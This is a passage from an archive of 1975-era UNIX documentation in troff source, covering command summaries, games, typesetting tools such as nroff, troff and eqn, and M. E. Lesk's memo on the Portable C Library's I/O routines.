Print contents of selected item.
.sh SORT
Sort or merge ASCII files line-by-line.
.op
Sort up or down.
.op
Sort lexicographically or on numeric key.
.op
Multiple keys located by delimiters or by character position.
.op
May sort upper case together with lower into dictionary order.
.op
Usable as a filter.
.sh UNIQ
Collapse successive duplicate lines
in a file into one line.
.op
Publishes lines that were originally unique,
duplicated, or both.
.op
May give redundancy count for each line.
.op
Usable as a filter.
.sh TR
Do one-to-one character translation according to
an arbitrary code.
.op
May coalesce selected repeated characters.
.op
May delete selected characters.
.op
Usable as a filter.
.sh DIFF
Report line changes, additions and deletions necessary to bring two files
into agreement.
.op
May produce an editor script to convert one file into another.
.sh COMM
Identify common lines in two sorted files.
Output in up to 3 columns shows lines present in first file only,
present in both, and/or present in second only.
.sh CMP
Compare two files and report disagreeing bytes.
.sh GREP
Print all lines in a file that satisfy
a pattern of the kind used in the editor ED.
.op
May print all lines that fail to match.
.op
May print count of hits.
.op
Usable as a filter.
.sh WC
Count the lines and \*(lqwords\*(rq (blank-separated strings) in a file.
.op
Usable as a filter.
.sh TYPO
Find typographical errors.
Statistically analyzes all the words in a text, weeds out
several thousand familiar ones, and publishes the rest sorted so that
the most improbably spelled ones
tend to come to the top of the list.
.sh GSI
Simulate Model 37 Teletype facilities on
GSI-300, DASI and other Diablo-mechanism terminals.
.op
Gives half-line and reverse platen motions.
.op
Approximates Greek letters and other special characters
by overstriking.
.op
Usable as a filter.
.sh COL
Canonicalize files with reverse line feeds
for one-pass printing.
.op
Usable as a filter.
-- /usr/doc/hel/hel4 mode=0100664 uid=3 gid=3 atime=170468778 mtime=173059648 --
.h0 "\n+a Novelties"
.in0
.sp
Source code for game-playing programs is not distributed.
.nr b 0 1
.sh SPEAK
Driver for Vocal Interface's V\s8OTRAX\s10 speech synthesizer.
Reads input text and utters it.
.op
Associative memory allows pronunciation rules
for whole words or word fragments to
be added, changed, deleted or queried.
.op
Can use different memories for different languages.
.op
Usable as a filter to make the output of
any other program audible.
.sh CHESS
This chess-playing program scored
1-2-1 and 3-0-1 in the 1973 and 1974 Computer Chess
Championships.
.sh BJ
A blackjack dealer.
.sh CUBIC
An accomplished player of 4\(mu4\(mu4 tic-tac-toe.
.sh MOO
A fascinating number-guessing game.
.sh CAL
Prints a calendar of specified month and year.
.sh UNITS
Converts amounts between different scales of measurement.
Knows hundreds of units.
For example, how many km/sec is a parsec/megayear?
.sh TTT
A tic-tac-toe program that learns.
It never makes the same mistake twice.
.sh QUIZ
Tests your knowledge of Shakespeare, Presidents, capitals, etc.
.sh WUMP
Hunt the wumpus, thrilling search in a dangerous cave.
-- /usr/doc/hel/hel5 mode=0110664 uid=3 gid=3 atime=170468780 mtime=173059648 --
.h0 "\\n+a Typesetting"
.nr b 0 1
.sp
.in0
This software is distributed separately as an enhancement
to U\s8NIX\s10.
.h0 "\na.\n+b Formatters"
.sp
.in0
High programming skill is required to
exploit the formatting capabilities
of these programs, although unskilled personnel can
easily be trained to enter documents according to canned
formats.
Terminal-oriented and
typesetter-oriented formatters are sufficiently compatible
that it is usually possible to define
interchangeable formats.
.sh NROFF
Advanced typesetting for terminals.
Style similar to ROFF, but capable of much more elaborate
feats of formatting, at a price in ease of use.
.op
All ROFF capabilities available or definable.
.op
Completely definable page format keyed to dynamically planted
\*(lqinterrupts\*(rq at specified lines.
.op
Maintains several separately definable typesetting environments (e.g. one for
body text, one for footnotes, and one for unusually elaborate
headings).
.op
Arbitrary number of output pools can be combined at will.
.op
Macros with substitutable arguments, and macros invocable
in mid-line.
.op
Computation and printing of numerical quantities.
.op
Conditional execution of macros.
.op
Tabular layout facility.
.op
Multicolumn output on terminals capable of reverse line feed,
or through the postprocessor COL.
.op
Usable as a filter
.sh Manual
Printed manual for NROFF.
.sh TROFF
Advanced phototypesetting for the Graphic Systems System/1.
Provides facilities like NROFF, augmented as follows.
This Summary was typeset by TROFF.
.op
Vocabulary of several 102-character fonts (4 simultaneously)
in 15 sizes.
.op
Positions expressible in inches, centimeters, ems, points,
machine units
or arithmetic combinations thereof.
.op
Access to character-width computation for unusually difficult
layout problems.
.op
Overstrikes, built-up brackets, horizontal and vertical line drawing.
.op
Dynamic relative or absolute positioning and size selection,
globally or at the character level.
.op
Terminal output for rough sampling of the product,
usually needs a wide platen.
Not a substitute for NROFF.
.op
Usable as a filter.
.sh Manuals
Printed manual and tutorial for TROFF.
.sh EQN
A mathematical typesetting preprocessor for TROFF.
Translates easily readable formulas, either in-line or displayed, into 
detailed typesetting instructions.
Formulas are written in a style like this:
.ti10m
.EQ
sigma sup 2 ~=~ 1 over N sum from i=1 to N ( x sub i - x bar ) sup 2
.EN
.br
which produces this:
.sp .1
.ti 10m
.EQ
.nr 99 \n(.s
.nr 98 \n(.f
.ps 10
.ft I
.ds 11 "\(*s
.nr 11 \w'\*(11'
.ps 8
.ds 12 "\fR2\fP
.nr 12 \w'\*(12'
.as 11 \v'-24u'\s8\|\*(12\s10\v'24u'
.ps 10
.nr 11 \n(11+\n(12+\w'\s8\|'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|=\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\fR1\fP
.nr 12 \w'\*(12'
.ds 13 "N
.nr 13 \w'\*(13'
.nr 14 \n(12
.if \n(13-\n(14 .nr 14 \n(13
.nr 14 \n(14+.4m
.ds 12 \v'42u'\h'\n(14u-\n(13u/2u'\*(13\
\h'-\n(13u-\n(12u/2u'\v'-78u'\*(12\
\h'-\n(14u-\n(12u/2u'\v'18u'\l'\n(14u'\v'18u'
.nr 12 \n(14
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 \v'.3m'\s16\(*S\s10\v'-.3m'
.nr 12 \w'\*(12'
'ps 7
.ds 13 "i\|=\|\fR1\fP
.nr 13 \w'\*(13'
'ps 7
.ds 14 "N
.nr 14 \w'\*(14'
'ps 10
.nr 15 \n(12
.if \n(13-\n(15 .nr 15 \n(13
.if \n(14-\n(15 .nr 15 \n(14
.ds 15 \v'60u'\h'\n(15u-\n(13u/2u'\s7\*(13\s10\h'-\n(15u-\n(13u/2u'\v'-60u'\
\h'\n(15u-\n(12u/2u'\*(12\h'\n(15u-\n(12u/2u'\
\v'-66u'\h'-\n(15u-\n(14u/2u'\s7\*(14\s10\h'\n(15u-\n(14u/2u'\v'66u'\

.as 11 "\*(15
.nr 11 \w'\*(11'
.ds 12 "\|\fR(\fP
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "x
.nr 12 \w'\*(12'
.ps 8
.ds 13 "i
.nr 13 \w'\*(13'
.as 12 \v'18u'\s8\*(13\|\s10\v'-18u'
.ps 10
.nr 12 \n(12+\n(13+\w'\s8\|'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\(mi\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "x
.nr 12 \w'\*(12'
.nr 12 \w'\*(12'
.nr 10 0
.if \n(ct-1 .nr 10 .25m
.nr 14 .15m
.if 2-\n(ct .nr 14 .1m
.ds 13 \v'.15m'\l'\n(12u\(rn'\v'-.15m'
.nr 13 \w'\*(13'
.as 12 \h'-\n(12u-\n(13u/2u+\n(14u'\v'0-\n(10u'\*(13\v'\n(10u'\h'-\n(13u+\n(12u/2u-\n(14u'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\fR)\fP
.nr 12 \w'\*(12'
.ps 8
.ds 13 "\fR2\fP
.nr 13 \w'\*(13'
.as 12 \v'-24u'\s8\|\*(13\s10\v'24u'
.ps 10
.nr 12 \n(12+\n(13+\w'\s8\|'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 11 \x'0'\x'0-30u'\fI\s10\*(11\s\n(99\f\n(98\x'42u'
.if \n(11-\n(.l .tm too-long eqn, file junk, between lines 2-4
.if 168-\n(.v .ne 168u
\*(11
.ps \n(99
.ft \n(98
.EN
.br
.op
Automatic calculation of size changes for subscripts, sub-subscripts,
etc.
.op
Full vocabulary of Greek letters, such as `gamma', `GAMMA'.
.op
Automatic calculation of large bracket sizes.
.op
Vertical \*(lqpiling\*(rq of formulae for matrices, conditional
alternatives, etc.
.op
Integrals, sums, etc. with arbitrarily complex limits.
.op
Diacriticals: dots, double dots, hats, bars.
.op
Easily learned by nonprogrammers and mathematical typists.
.op
Usable as a filter.
.sh Manual
Printed manual for EQN.
.sh NEQN
A mathematical typesetting preprocessor for NROFF.
Prepares formulas for display on
Model 37 Teletypes with half-line functions
and 128-character font.
.op
For Diablo-mechanism terminals, filter output through GSI.
.op
Same facilities as EQN within graphical capability of
terminal.
.sh TBL
A preprocessor for NROFF/TROFF
that translates simple descriptions of table layouts
and contents into detailed typesetting instructions.
.op
Computes column widths.
.op
Handles left- and right-justified columns,
centered columns and decimal-point
alignment.
.op
Places column titles.
.sh MS
A standardized manuscript layout
for use with NROFF/TROFF.
.op
Page numbers and draft dates.
.op
Cover sheet and title page.
.op
Automatically numbered subheads.
.op
Footnotes.
.op
Single or double column.
.op
Paragraphing, display and indentation.
.op
Numbered equations.
.h0 "\na.\n+b U\s8NIX\s10 Programmer's Manual"
.sh MAN
Print specified manual section on your terminal.
.sh Manual
Machine-readable version of the U\s8NIX\s10 
Programmer's Manual.
.op
System overview.
.op
All commands.
.op
All system calls.
.op
All subroutines in assembler, C and FORTRAN libraries.
.op
All devices and other special files.
.op
Formats of file system and kinds
of files known to system software.
.op
Boot procedures.
.sp
.ti4i
May, 1975
.sp
.in0
* DEC, PDP and DECtape are registered trademarks of Digital
Equipment Corporation.
V\s8\OTRAX\s10 is a registered trademark of
Vocal Interface Division, Federal Screw Works.
-- /usr/doc/hel/junk mode=0100664 uid=3 gid=3 atime=170468781 mtime=173059648 --
.sh GSI
Simulate Model 37 Teletype facilities on
GSI-300, DASI and other Diablo-mechanism terminals.
.op
Gives half-line and reverse platen motions.
.op
Approximates Greek letters and other special characters
by overstriking.
.op
Usable as a filter.
.sh COL
Canonicalize files with reverse line feeds
for one-pass printing.
.op
Usable as a filter.
-- /usr/doc/iolib mode=0140775 uid=3 gid=3 atime=173059652 mtime=173059507 --
-- /usr/doc/iolib/iolib mode=0110664 uid=3 gid=3 atime=173059398 mtime=173059653 --
.ds s \\s8
.ds S \\s0
.ds * \v'.2m'*\v'-.2m'
.tr ~.
.ds . \s14~\s0
.tr _\(ul
.de sn
.sp
.ft I
.ne 2
..
.de sN
.sp .5
.ft R
..
.TL
The Portable C Library (on \s-2UNIX\s0) *
.AU
M. E. Lesk
.AI
.MH
.SH
1. INTRODUCTION
.PP
The C language [1] now exists on three operating systems.
.FS
* This document is an abbreviated form of
``The Portable C Library'', by M. E. Lesk, describing only
the UNIX section of the library.
.FE
A set of library routines common to
\*sPDP\*S 11 \*sUNIX\*S, Honeywell 6000 \*sGCOS\*S,
and \*sIBM\*S 370 \*sOS\*S
has been provided to improve program portability.
This memorandum describes the UNIX implementation of
the portable routines.
.PP
The programs
defined here were chosen to follow the standard routines
available on \*sUNIX\*S, with alterations to improve transferability
to other computer systems.  It is expected that future C implementations
will try to support the basic library outlined in this document.
It provides character stream input and output on multiple files;
simple accessing of files by name; and some elementary
formatting and translating routines.
The remainder of this memorandum lists the portable and
non-portable library routines and explains some of the programming
aids available.
.PP
The I/O routines in the C library
fall into several classes.
Files are addressed through intermediate numbers called
.I
file-descriptors
.R
which are described in section 2.  Several default file-descriptors
are provided by the system; other aspects of the system
environment are explained in section 3.
.PP
Basic character-stream input and output involves the reading or writing of
files considered as streams of characters.
The C library
includes facilities for this, discussed
in section 4.
Higher-level character stream operations permit translation of
internal binary representations of numbers to and from
character representations, and formatting or unpacking of character
data.
These operations are performed with the subprograms in section 5.
Binary input and output routines permit data transmission
without the cost of translation to or from readable \*sASCII\*S character representations.
Such data transmission
should only be directed to files or tapes, and not to
printers or terminals.  As is usual with such routines, the
only simple guarantee that can be made to the programmer seeking
portability is that data written by a particular sequence of
binary writes, if read by the exactly matching sequence of binary reads,
will restore the previous contents of memory.
Other reads or writes have system-dependent effects.
See section 6 for a discussion of binary input and output.
Section 7 describes some further routines in the portable library.
These include a storage allocator and
some other control and conversion functions.
.SH
2. FILE DESCRIPTORS
.PP
Except for the standard input and output files, all files must
be explicitly opened before
any I/O is performed on them.
When files are opened for writing, they are created if not already present.
They must be closed when finished, although the normal
.I
cexit
.R
routine will take care of that.
When opened a disc file or device is associated with a file descriptor, an integer
between 0 and 9.
This file descriptor is used for further I/O to the file.
.PP
Initially you are given three file descriptors by the system: 0, 1, and 2.
File 0 is the standard input; it is normally the teletype
in time-sharing or input data cards in batch.
File 1 is the standard output; it is normally the
teletype in time-sharing or the line printer in batch.
File 2 is the error file; it is an output file, normally the same
as file 1, except that when file 1 is diverted via a command
line '>' operator, file 2 remains attached to the
original destination, usually the terminal.
It is used for error message output.
These popular \*sUNIX\*S conventions are considered part
of the C library specification.
By closing 0 or 1, the default input or output may be re-directed;
this can also be done on the command line by
.ft I
>file
.ft P
for output or
.ft I
<file
.ft P
for input.
.PP
Associated with the portable library
are two external integers,
named
.I
cin
.R
and
.I
cout.
.R
These are respectively the numbers of the
standard input unit and standard output unit.
Initially 0 and 1 are used, but you may redefine
them at any time.
These cells are used by the routines
.I
getchar,
putchar,
gets,
.R
and
.I
puts
.R
to select their I-O unit number.
.SH
3. THE C ENVIRONMENT
.PP
The C language is almost exactly the same on all machines,
except for essential machine differences such as word
length and number of characters per word. 
On \*sUNIX\*S
\*sASCII\*S character code is used.
Characters range from \(mi128 to +127 in numeric value,
there is sign extension when characters are assigned to integers,
and right shifts are arithmetic.
The ``first'' character in a word is stored in the right half word.
.PP
More serious problems of compatibility are caused by the loaders
on the different operating systems.
.PP
\*sUNIX\*S permits external names to be in
upper and lower case,
up to seven characters long.
There may be multiple external definitions (uninitialized) of
the same name.
.PP
The C alphabet for identifier names includes
the upper and lower case letters, the digits, and the underline.
It is not possible for C programs to communicate with
\*sFORTRAN\*S programs.
.SH
4. BASIC CHARACTER STREAM ROUTINES
.PP
These routines transfer streams of characters in and out of
C programs.  Interpretation of the characters is left to
the user.
Facilities for interpreting numerical strings are presented in section
5; and routines to transfer binary data to and from files or devices
are discussed in section 6.
In the following routine descriptions, the optional
argument
.ft I
fd
.ft P
represents a file-descriptor; if not present, it is taken
to be 0 for input and 1 for output.  When your program
starts, remember that these are associated with the ``standard''
input and output files.
.sn
COPEN (filename, type)
.sN
\fICopen\fR initiates activity on a file; if necessary it will
create the file too.
Up to 10 files may be open at one time.
When called as described here,
.ft I
copen
.ft R
returns a filedescriptor for a character stream file.
Values less than zero returned by
.I
copen
.R
indicate an error trying to open the file.
Other calls to
.ft I
copen
.ft R
are described in sections 6 and 7.
.sp 3p
Arguments :
.sp 3p
.ft I
Filename:
.ft P
a string representing a file name, according to the
local operating system conventions.
All accept a string of letters and digits as a legal file name,
although leading digits are not recommended on \*sGCOS\*S.
.br
.ft I
Type:
.ft R
a character `r', `w', or `a' meaning read, write, or append.
Note that the type is a single character, whereas the
file name must be a string.
.sn
CGETC ( fd )
.sN
.ft I
Cgetc
.ft R
returns the next character from the input unit associated with \fIfd\fR. 
On end of file \fIcgetc\fR returns `\\0'.
To signal end of file from the teletype,
type the special symbol appropriate to \*sUNIX\*S:
EOT (control-D)
.sn
CPUTC (ch , fd )
.sN
.ft I
Cputc
.ft R
writes a character onto the given output unit.
.ft I
Cputc
.ft R
returns as its value the character written.
.PP
Output for disk files is buffered
in 512 character units, irrespective
of newlines;
teletype output goes character by character
.sn
CCLOSE (fd)
.sN
Activity on file
.ft I
fd
.ft R
is terminated and
any output buffers are emptied.
You usually don't have to call
.ft I
cclose; cexit
.ft R
will
do it for you on all open files.
However, to write some data
on a file and then read it back in, the correct sequence is:
.DS
fd = copen (``file'', `w');
write on fd ...
cclose (fd);
fd = copen(``file'', `r');
read from fd ...
.DE
.sn
CFLUSH (fn)
.sN
To get buffer flushing, but retain the ability to write more
on the file, you may call this routine.
.PP
Normally, output intended
for the teletype is not buffered
and this call is not needed.
.sn
CEXIT ([errcode])
.sN
.ft I
Cexit
.ft R
closes all files and then terminates execution.
If a non-zero argument is given, this is assumed to be
an error indication or other returned value to be signalled
to the operating system.
.PP
.I
Cexit
.R
.B
must
.R
be called explicitly; a return
from the main program is not
adequate.
.sn
CEOF (fd)
.sN
.ft I
Ceof
.ft R
returns nonzero when end of file has been reached on input unit \fIfd.\fR
.sn
GETCHAR ()
.sN
.ft I
Getchar
.ft R
is a special case of \fIcgetc;\fR it reads
one character from the standard input unit.
.ft I
Getchar (\|)
.ft R
is defined as
.ft I
cgetc (cin);
.ft R
it should not have an argument.
.sn
PUTCHAR (ch)
.sN
.ft I
Putchar (ch)
.ft R
is the same as
.ft I
cputc (ch, cout);
.ft R
it writes one character on the standard output.
.sn
GETS (s)
.sN
.ft I
Gets
.ft R
reads everything up to the next newline into the
string pointed to by \fIs.\fR  If the last character read
from this input unit was newline, then \fIgets\fR reads
the next line, which on \*sGCOS\*S and \*sIBM\*S corresponds exactly
to a logical record.
The terminating newline is replaced by `\\0'.
The value of \fIgets\fR is \fIs,\fR or 0 if end of file.
.sn
PUTS (s)
.sN
Copies the string \fIs\fR onto the standard output unit. 
The terminating `\\0' is replaced by a newline character.
The value of
.I
puts
.R
is
.I
s.
.R
.sn
UNGETC (ch , fd)
.sN
.ft I
Ungetc
.ft R
pushes back its character argument to the unit
.ft I
fd,
.ft R
which must be open for input.
After
.ft I
ungetc (`a', fd); ungetc (`b', fd);
.ft R
the next two characters
to be read from \fIfd\fR will be `b' and then `a'.
Up to 100 characters may be pushed back on each file.
This subroutine permits a program to read past the end
of its input, and then restore it for the next routine to read.
It is impossible to change an external file with
.ft I
ungetc;
.ft R
its purpose is only for internal communications, most particularly
.ft I
scanf,
.ft R
which is described in section 5.
Note that
.ft I
scanf
.ft R
actually requires only one character
of ``unget'' capability; thus it is possible that
future implementors may change the specification of the
.ft I
ungetc
.ft R
routine.
.SH
5. HIGH-LEVEL CHARACTER STREAM ROUTINES
.PP
These two routines,
.ft I
printf
.ft R
for output and
.ft I
scanf
.ft R
for input, permit simple translation to and from character
representations of numerical quantities.
They also allow generation or interpretation of formatted
lines.
.sn
PRINTF (\|[fd, ] control-string, arg1, arg2, ...)
.sp .5
PRINTF (\|[\(mi1, output-string, ] control-string, arg1, arg2, ...)
.sN
.ft I
Printf
.ft R
converts, formats, and prints its arguments under control of the
control string.
The control string contains two types of objects: plain characters,
which are simply copied to the output stream, and conversion
specifications, each of which causes conversion and printing of the
next successive argument to \fIprintf\fR.
.sp
Each conversion specification is introduced by the character `%'.
Following the `%', there may be:
.in 5
\(em an optional minus sign `\(mi' which specifies left adjustment of the
converted argument in the indicated field;
.sp 3p
\(em an optional digit string specifying a minimum field width; if the converted
argument has fewer characters than the field width it will be padded
on the left (or right, if the left
adjustment indicator has been given) to make up the field width;
the padding character is blank normally and zero if the field
width was specified with a leading zero
(note that this does not imply an octal field width);
.sp 3p
\(em an optional period `.' which serves to separate the field width
from the next digit string;
.sp 3p
\(em an optional digit string (the precision) which specifies the maximum
number of characters to be printed from a string,
or the number of digits to be printed to the right
of the decimal point of a floating or double number.
.sp 3p
\(em an optional length modifier \(fml\(fm which indicates that the corresponding
data item is a
.I
long
.R
rather than an
.I
int.
.R
.sp 3p
\(em a character which indicates the type of conversion to be applied.
.in 0
.sp
The conversion characters and their meanings are:
.in 5
.sp 5p
.ti -0.2i
\fBd\fR	The argument is converted to decimal notation.
.sp 3p
.ti -0.2i
\fBo\fR	The argument is converted to octal notation.
.sp 3p
.ti -0.2i
\fBx\fR	The argument is converted to hexadecimal notation.
.sp 3p
.ti -0.2i
\fBu\fR	The argument is converted to unsigned decimal notation.
This is only implemented (or useful) on \*sUNIX\*S.
.sp 3p
.ti -0.2i
\fBc\fR	The argument is taken to be a single character.
.sp 3p
.ti -0.2i
\fBs\fR	The argument is taken to be a string and characters from the
string are printed until a null character is reached or until the
number of characters indicated by the precision specification
is exhausted.
.sp 3p
.ti -0.2i
\fBe\fR	The argument is taken to be a float or double
and converted to decimal notation of the form
.ft I
[\(mi]\|m.nnnnnnE\|[\(mi]\|xx
.ft R
where the length of the string of \fIn\fP's is specified by
the precision.
The default precision is 6 and the maximum is 22.
.sp 3p
.ti -0.2i
\fBf\fR	The argument is taken to be a float or double and
converted to decimal notation of the
form
.ft I
[\(mi]mmm.nnnnn
.ft R
where the length of the string of
\fIn\fR's is specified by
the precision.  The default precision is 6 and the maximum
is 22.
Note that the precision does not determine
the number of significant digits printed in \fBf\fR format.
.in 0
.sp 3p
If no recognizable conversion character appears after the `%', that character
is printed; thus `%' may be printed by use of the string ``%%''.
.PP
As an example of \fIprintf,\fR the following program fragment
.DS
.I
int i, j; float x; char \**s;
i = 35; j=2; x= 1.732; s = ``ritchie'';
printf (``%d %f %s\\n'', i, x, s);
printf (``%o, %4d or %\(mi4d%5.5s\\n'', i, j, j, s);
.R
.DE
would print
.DS
.I
.cs I 24
35 1.732000 ritchie
043,    2 or 2   ritch
.cs I
.R
.DE
.PP
If \fIfd\fR is not specified, output is to unit
.I
cout.
.R
It is possible to direct output to a string instead of to a file.
This is indicated by \(mi1 as the first argument.
The second argument should be a pointer to the string.
\fIPrintf\fR will put a terminating `\\0' onto the string.
.sn
SCANF (\|[fd, ] control-string, arg1, arg2, ....)
.sp .5
SCANF (\|[\(mi1, input-string, ] control-string, arg1, arg2, ....)
.sN
.ft I
Scanf
.ft R
reads characters, interprets
them according to a format, and stores the results in its arguments.
It expects as arguments:
.ti 5
.ti -0.2i
1.	An optional file-descriptor or input-string, indicating the source of the input
characters; if omitted, file
.I
cin
.R
is used;
.ti -0.2i
2.	A control string, described below;
.ti -0.2i
3.	A set of arguments,
.ft I
each of which must be a pointer,
.ft R
indicating where the converted input should be stored.
.in 0
.sp 5p
The
control string
usually contains
conversion specifications, which are used to direct interpretation
of input sequences.
The control string may contain:
.sp 5p
.in 5
.ti -0.2i
1.	Blanks, tabs or newlines, which are ignored.
.ti -0.2i
2.	Ordinary characters (not %) which are expected to match
the next non-space character of the input stream
(where space characters are defined as blank, tab or newline).
.ti -0.2i
3.	Conversion specifications, consisting of the
character %, an optional assignment suppressing character \**,
an optional numerical maximum field width, and a conversion
character.
.in 0
.sp 5p
A conversion specification is used to direct the conversion of the
next input field; the result
is placed in the variable pointed to by the corresponding argument,
unless assignment suppression was
indicated by the \** character.
An input field is defined as a string of non-space characters;
it extends either to the next space character or until the field
width, if specified, is exhausted.
.PP
The conversion character indicates the interpretation of the
input field; the corresponding pointer argument must
usually be of a restricted type.
Pointers, rather than variable names, are required
by the ``call-by-value'' semantics of the C language.
The following conversion characters are legal:
.in 5
.ti -0.2i
\fB%\fR	indicates that a single % character is expected
in the input stream at this point;
no assignment is done.
.tr @ 
.ti -0.2i
\fBd\fR	indicates that a decimal integer is expected
in the input stream;
the corresponding argument should be an integer pointer.
.ti -0.2i
\fBo\fR	indicates that an octal integer is expected in the
input stream; the corresponding argument should be a integer pointer.
.ti -0.2i
\fBx\fR	indicates that a hexadecimal integer is expected in the input stream;
the corresponding argument should be an integer pointer.
.ti -0.2i
\fBs\fR	indicates that a character string is expected;
the corresponding argument should be a character pointer
pointing to an array of characters large enough to accept the
string and a terminating `\\0', which will be added.
The input field is terminated by a space character
or a newline.
.ti -0.2i
\fBc\fR	indicates that a single character is expected; the
corresponding argument should be a character pointer;
the next input character is placed at the indicated spot.
The normal skip over space characters is suppressed
in this case;
to read the next non-space character, try
.ft I
%1s.
.ft R
.ti -0.2i
\fBe\fR or \fBf\fR indicates that a floating point number is expected in the input stream;
the next field is converted accordingly and stored through the
corresponding argument, which should be a pointer to a float.
The input format for
.I
floats
.R
is
a string of numbers
possibly containing a decimal point, followed by an optional
exponent field containing an E or e followed by a possibly signed integer.
.ti -0.2i
\fB[\fR	indicates a string not to be delimited by space characters.
The left bracket is followed by a set of characters and a right
bracket; the characters between the brackets define a set
of characters making up the string.
If the first character
is not circumflex (\|^\|), the input field
is all characters until the first character not in the set between
the brackets; if the first character
after the left bracket is ^, the input field is all characters
until the first character which is in the remaining set of characters
between the brackets.
The corresponding argument must point to a character array.
.in 0
.PP
The conversion characters
.I
d, o
.R
and
.I
x
.R
may be preceded by 
.I
l
.R
to indicate that a pointer to
.I
long
.R
rather than
.I
int
.R
is expected.
Similarly, the conversion characters
.I
e
.R
or
.I
f
.R
may be preceded by
.I
l
.R
to indicate that a pointer to 
.I
double
.R
rather than 
.I
float
.R
is in the argument list.
The character
.I
h
.R
will function similarly in the future to indicate
.I
short
.R
data items.
.PP
For example, the call
.in 10
.nf
.ft I
int i; float x; char name[50];
scanf ( ``%d%f%s'', &i, &x, name);
.ft R
.in 0
with the input line
.in 10
.ft I
25   54.32E\(mi1  thompson
.ft R
.in 0
.fi
will assign to
.ft I
i
.ft R
the value
25,
.ft I
x
.ft R
the value 5.432, and
.ft I
name
.ft R
will contain
.ft I
``thompson\\0''.
.ft R
Or,
.ft I
.nf
.in 10
int i; float x; char name[50];
scanf (``%2d%f%\**d%[1234567890]'', &i, &x, name);
.ft R
.in 0
with input
.ft I
.in 10
56789 0123 56a72
.ft R
.in 0
.fi
will assign 56 to
.ft I
i,
.ft R
789.0 to
.ft I
x,
.ft R
skip ``0123'',
and place the string ``56\\0'' in
.ft I
name.
.ft R
The next call to \fIcgetc\fR will return `a'.
.PP
.ft I
Scanf
.ft R
returns as its value the number of successfully matched and assigned input
items.
This can be used to decide how many input items were found.
On end of file, \(mi1 is returned; note that this is different
from 0, which means that the next input character does not
match what you called for in the control string.
.ft I
Scanf,
.ft R
if given a first argument of \(mi1, will scan a string in memory
given as the second argument.  For example,
if you want to read up to four numbers from an input line
and find out how many there were, you could try
.ft I
.in 5
.nf
.ne 3
int a[4], amax;
char line[100];
amax = scanf (\(mi1, gets(line), ``%d%d%d%d'', &a[0], &a[1], &a[2], &a[3]);
.in 0
.ft R
.fi
.SH
6. BINARY STREAM ROUTINES
.PP
These routines write binary data, not translated to printable characters.
They are normally efficient
but do not produce files that can be printed or easily interpreted.
No special information is added
to the records and thus they can be handled by
other programming systems
.ft I
if
.ft R
you make the departure from portability required
to tell the other system how big a C item (integer, float,
structure, etc.) really is in machine units.
.sn
COPEN (name, direction, ``i'')
.sN
When
.ft I
copen
.ft R
is called with a third argument as above, a binary stream
filedescriptor is returned.
Such a file descriptor is required for the remaining
subroutines in this section, and may not be used with
the routines in the preceding two sections.
The first two arguments operate exactly as described in section
3;
further details are given in section 7.
An ordinary file descriptor may be used for binary I-O,
but binary and character I-O may not be mixed
unless
.I
cflush
.R
is called at each switch to binary I-O.
The third
argument to
.I
copen
.R
is ignored.
.sn
CWRITE (\|ptr, sizeof(\**ptr), nitems, fd\|)
.sN
.ft I
Cwrite
.ft R
writes
.ft I
nitems
.ft R
of data beginning at
.ft I
ptr
.ft R
on file
.ft I
fd.
Cwrite
.ft R
writes blocks of binary information, not translated to
printable form, on a file.  It is intended for machine-oriented
bulk storage of intermediate data.  Any kind of data may
be written with this command, but only the corresponding
.ft I
cread
.ft R
should be expected to make any sense of it on return.
The first argument is a pointer to the beginning of a vector
of any kind of data.  The second argument
tells
.ft I
cwrite
.ft R
how big the items are.
The third argument specifies the number
of the items to be written; the fourth indicates where.
.sn
CREAD (\|ptr, sizeof(\**ptr), nitems, fd\|)
.sN
.ft I
Cread
.ft R
reads up to
.ft I
nitems
.ft R
of data from file
.ft I
fd
.ft R
into a buffer beginning at
.ft I
ptr.
Cread
.ft R
returns the number of items read.
.br
.ne 2i
The returned
number of items will be equal to the number requested by
.I
nitems
.R
except for reading certain devices (e.g. the teletype or magnetic tape)
or reading the final bytes of a disk file.
.LP
Again, the second argument indicates the size
of the data items being read.
.sn
CCLOSE (fd)
.sN
The same description applies as for
character-stream files.
.SH
7. OTHER PORTABLE ROUTINES
.LP
.sn
REW (fd)
.sN
Rewinds unit
.I
fd.
.R
Buffers are emptied properly and the file
is left open.
.sn
SYSTEM (string)
.sN
The given
.I
string
.R
is executed as if it were typed at the terminal.
.sn
NARGS (\|)
.sN
A subroutine can call
this function to try to find out how many arguments it was called with.
Normally,
.I
nargs()
.R
returns the number of arguments
plus 3 for every
.I
float
.R
or
.I
double
.R
argument
and plus one for every
.I
long
.R
argument.
If the new \*sUNIX\*S feature of separated instruction and data space
areas is used,
.I
nargs()
.R
doesn't work at all.
.sn
CALLOC (n, sizeof(object))
.sN
.I
Calloc
.R
returns a pointer to new storage, allocated in space
obtained from the operating system.
The space obtained is
well enough aligned for any use, i.e.
for a double-precision number.
Enough space to store
.I
n
.R
objects of the size
indicated by the second argument
is provided.
The
.I
sizeof
.R
is executed at compile time; it is not in the library.
A returned value of \(mi1 indicates failure to obtain space.
.sn
CFREE (ptr, n, sizeof(*ptr))
.sN
.I
Cfree
.R
returns to the operating system
memory starting at
.I
ptr
.R
and extending for
.I
n
.R
units of the size given by the third argument.
The space should have been obtained through \fIcalloc\fR.
On \*sUNIX\*S you can
only return the exact amount of space
obtained by 
.I
calloc;
.R
the second and third arguments are ignored.
.sn
FTOA (floating-number, char-string, precision, format\|)
.sN
.ft I
Ftoa
.ft R
(floating to \*sASCII\*S conversion)
converts floating point numbers to character strings.
The
.ft I
format
.ft R
argument should be either `f' or `e'; `e' is default.
See the explanation of
.ft I
printf
.ft R
in section 5 for a description of the result.
.sn
ATOF (char-string)
.sN
Returns a floating value equal to the
value of the \*sASCII\*S character string argument,
interpreted as a decimal floating point number.
.sn
TMPNAM (str)
.sN
